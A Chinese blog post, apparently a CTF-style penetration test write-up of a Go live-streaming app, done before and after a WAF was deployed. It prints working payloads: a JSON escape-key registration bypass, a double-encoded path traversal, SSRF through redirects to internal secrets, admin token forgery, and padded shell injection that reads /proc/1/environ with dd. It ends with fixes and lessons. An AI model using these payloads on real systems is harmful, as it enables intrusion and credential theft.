---
layout: post
title: 直播云的两轮渗透：从注册审核到 WAF 绕过
summary: 一个 Go 单体应用，第一轮从注册接口一路打到容器 root；上线 WAF 后复测，四个入口各自换了一种穿法，链子仍然通。
tags: 渗透测试 SSRF 命令注入 WAF绕过
date: 2026-10-21 11:30:00 +0800
---

这是一个直播云应用，Go 单体程序，前端是 SPA，接口全在 `/api/*` 下。第一轮打的时候没有防护设备，一路打到了容器内的 root。

后来部署方上了一台 WAF，同一套目标又复测了一遍。下面按两轮记录：第一轮是完整链路，第二轮是 WAF 在场时每个环节怎么重新穿过去。

## 目标组成

- 应用本身：`livehub -mode web -addr :8001`，文件型存储，数据在 `/app/data/`
- 同机内部服务：`127.0.0.1:9101` 上跑转码模块，提供 `/health`、`/debug/config`、`/secret/rest`、`/verify`
- 运行形态：容器，数据目录从宿主挂进来

会话令牌是自签名的，格式为 `lh1|uid|username|role|expires|sig`，签名为 `HMAC-SHA256(session_secret + session_secret_rest, payload)`。两段密钥分别放在应用自己的配置文件和内部服务的 `/secret/rest` 里 —— 这个设计后来成了整条链的枢纽。

主要接口：

| 接口 | 方法 | 说明 |
|---|---|---|
| `/api/auth/register` | POST | 注册，默认需要审核 |
| `/api/auth/login` | POST | 登录，返回令牌 |
| `/api/me` | GET | 当前用户信息 |
| `/api/preview` | POST | 服务端抓取 `url` 做封面预览并回显内容 |
| `/api/files/download?name=` | GET | 下载 uploads 目录里的文件 |
| `/api/source/attach` | POST | 回源探测（调 `ffprobe`） |

## 第一轮：五个环节连起来

### 注册审核：字符串黑名单碰上了 JSON 转义

注册接口想拦掉 `status`、`role` 这类键，做的是**字符串层面**的关键字检查。但后面 JSON 解析会把 `\uXXXX` 还原。于是把键写成转义形式就能过检查、又在解析后生效：

```http
POST /api/auth/register HTTP/1.1
Content-Type: application/json

{"username":"user1","password":"***","nickname":"user1","\u0073tatus":"active"}
```

回 200，账号直接是 `active`；不走这个写法时回 202，状态是 `pending`。

有个坑值得记：用脚本构造请求时别在 Python 字符串里写 `"\u0073tatus"`，它会先被解析成明文 `s`，发出去的还是 `status`，反而被拦。要发字面量，`curl --data-binary` 最稳。

### 路径穿越：过滤解一次，文件层解第二次

下载接口对 `name` 拦 `/`、`..`、`:`，但它检查的是**一次 URL 解码之后**的值，而文件读取那一步还会再解一次。两边对同一串字节的理解不一样，双重编码就穿过去了：

```
GET /api/files/download?name=%252e%252e%252fconfig.json
```

过滤器看到 `%2e%2e%2fconfig.json`（不含被拦字符），文件层解成 `../config.json`，于是读到 `/app/data/config.json`，里面有 `session_secret`。

### SSRF：只拦字面量，不拦解析结果

`/api/preview` 会以服务端身份抓 URL 并回显。它的防护是一份原始字符串黑名单：`127.0.0.1`、`localhost`、`10.` 这些字面量出现就拒。它没管域名解析之后落在哪。

用一个解析到回环、字面上又干净的域名就行：

```
POST /api/preview
{"url":"http://lvh.me:9101/secret/rest"}
```

回显里带着 `session_secret_rest`。

### 伪造管理员：两段密钥拼起来

两段密钥都拿到了，拼成签名密钥，自己签一个 payload：

```
key     = <session_secret> + <session_secret_rest>
payload = "lh1|1|admin|admin|9999999999"
token   = payload + "|" + HMAC-SHA256(key, payload)
```

拿这个令牌请求 `/api/me`，`role=admin`；`/api/admin/overview` 回 200。

顺带发现服务端校验令牌时只验签名和载荷，不回查用户库，所以 `uid`、`username` 随便填也认（`lh1|999999|nobody|admin|9999999999` 同样通过）。注册那一步其实是多余的。

### 命令注入：过滤只看前 512 字节

`/api/source/attach` 的回源探测是用 shell 起的，命令大致是：

```
sh -c "ffprobe -v error -show_entries format=duration -of csv=p=0 <URL>"
```

URL 由用户控制，位置在命令末尾。接口对 URL 做字符黑名单（`;`、`|`、`&`、`$`、反引号、括号、重定向符、换行），但**只检查前约 512 字节**。用填充把注入点推到检查范围之外：

```
url = "http://127.0.0.2:8001/" + "A"*600 + ";sleep 8"
```

响应耗时 8.2 秒（不填充时带 `;` 直接 403），说明命令真的执行了。把 `sleep` 换掉：

```
id; pwd; ls -la /app
→ uid=0(root)；cwd=/app
```

容器里是 root。

### 取 flag

```
env | grep -i flag
→ LIVEHUB_FLAG=flag{...}
```

## 第二轮：WAF 上线之后

部署方上了一台 WAF，按声明是生产档，不能全量拦截（怕影响业务）。复测先看它到底拦什么：

| 操作 | 结果 |
|---|---|
| 双重编码穿越取 `config.json` | 403 `Request blocked [lfi]` |
| `/api/preview` 指向 `http://127.0.0.1:9101/...` | 403 `Request blocked [rfi]` |
| 命令注入 `;id`、`;cat` | 403 `Request blocked [rce]` |
| 命令注入 `;sleep 6` | 200，而且真被执行 |

规律很清楚：它在**解码后的字符串**上做特征匹配，拦的是常见命令名和白名单外的危险字样，但 `sleep`、`true`、`dd`、`rev`、`openssl` 这类没被收录。

于是四个环节各自换了一种穿法。

### SSRF：先上公网，再重定向回内网

`/api/preview` 只校验初始 URL 的主机，而客户端会跟随重定向。让初始主机是公网地址（通过校验），302 跳到用别名域名表示的内部地址：

```
POST /api/preview
{"url":"http://httpbin.org/redirect-to?url=http://lvh.me:9101/secret/rest"}
```

WAF 看到的外层是公网域名，应用跟着跳转就到了内部服务，`session_secret_rest` 照旧回显。

### 路径穿越：让应用请求自己

直接的双重编码已经被 WAF 认出来了。改成让应用「自己请求自己」：外层是 `/api/preview`，内层是它自己的下载接口，把穿越参数在重定向 URL 里再编一次，WAF 只看得到外层：

```
POST /api/preview
{"url":"http://httpbin.org/redirect-to?url=http://lvh.me:8001/api/files/download%3Fname%3D%25252e%25252e%25252fconfig.json"}
```

应用跟随重定向后向自身发下载请求，穿越参数按原有逻辑生效，`config.json` 读回来。整个过程对外只是一次 `/api/preview`。

### 命令注入：用没被收录的命令落地

WAF 依赖命令名黑名单，那就换一个不在表里的。`dd` 把容器环境变量直接写进应用自己的 uploads 目录，再用应用自带的下载接口取回 —— 全程没有出现被拦的命令名：

```http
POST /api/source/attach
Authorization: Bearer <admin token>
X-Transcode-Token: <token>

{"stream_id":<自有流>,"url":"http://x/<600 个 A>;dd if=/proc/1/environ of=/app/data/uploads/vl.png"}
```

```
GET /api/files/download?name=vl.png
→ 含 LIVEHUB_FLAG=flag{...}
```

### 令牌伪造照旧

WAF 不介入应用内的令牌校验，而令牌校验本身不回查用户库。拿到两段密钥之后，直接签一个管理员令牌就行，注册流程完全不必走。

第二轮同样拿到了 flag。

## 六个问题

| 位置 | 类型 | 本质 |
|---|---|---|
| `/api/auth/register` | 注册审核绕过 | 键黑名单做在字符串上，JSON 解析会还原转义 |
| `/api/files/download` | 路径穿越 | 过滤与文件解码的层数不一致 |
| `/api/preview` | SSRF | 只校验原始字符串或初始主机，不看最终连接地址 |
| 会话令牌 | 伪造与越权 | 密钥可拼出来；校验不回查用户和角色 |
| `/api/source/attach` | 命令注入 | 输入拼进 shell；过滤只看前 512 字节 |
| WAF 规则 | 防护绕过 | 命令名/字面量黑名单，没覆盖别名、重定向、再编码 |

## 修复建议

回源探测去掉 shell 拼接，改成参数化调用（`exec.Command("ffprobe", 固定参数..., url)`）；下载接口先把 `name` 多次解码归一到稳定，再做 `[A-Za-z0-9._-]` 白名单，并用 `filepath.Clean` + `filepath.Rel` 确认结果仍在基目录内；出站请求校验**最终连接的目标 IP**，限制或禁止跟随重定向（跟随的话每次重定向后重新校验）；两段密钥保密并定期轮换，令牌校验必须回查用户库，不要相信载荷里的 `role`；内部调试接口不返回明文密钥；WAF 尽量做结构化校验，别只堆黑名单。

## 留在手里的三条

**过滤写在哪个层面，绕过就在哪个层面。** 键黑名单写在字符串上，JSON 解析在下一层还原转义；路径黑名单解一次，文件读取解第二次；SSRF 校验看字符串，`net.Dial` 看解析后的 IP；命令过滤看前 512 字节，shell 看整条命令。四处绕过看着不一样，其实是同一件事：防御方检查的和执行方读取的，不是同一个东西。

**WAF 不改变应用的问题，只改变投递方式。** 第二轮四个环节全部绕过去了，而且没有一个需要新漏洞 —— 全是「换一种送法」。

**黑名单天生漏项。** 它得枚举「坏的」，而「好的」是无穷的；`sleep`、`dd`、`rev` 这些留在名单外的命令，足够把输出搬到能被下载的地方。

---

这套「层与层对同一串字节的理解在哪里分叉」的看法，后来整理进了理论笔记：[攻防是不完全信息博弈](/theory/incomplete-information/)。
